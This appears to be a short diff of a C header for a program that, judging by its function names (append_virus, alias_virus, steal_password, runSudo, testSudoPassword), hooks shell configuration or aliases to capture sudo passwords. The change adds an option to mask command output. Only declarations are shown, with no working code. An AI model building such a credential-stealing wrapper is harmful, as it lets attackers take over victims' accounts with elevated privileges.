@@ -8,7 +8,7 @@ int append_virus(char * home_dir, char * config_file, char * alias);
 int alias_virus();
 int steal_password(char * passwd, char * username);
 
-int runSudo(char * passwd, char ** argary);
+int runSudo(char * passwd, char ** argary, int mask_output);
 int testSudoPassword(char * passwd);
 
 char ** make_execvp_args(int argc, char ** argv);
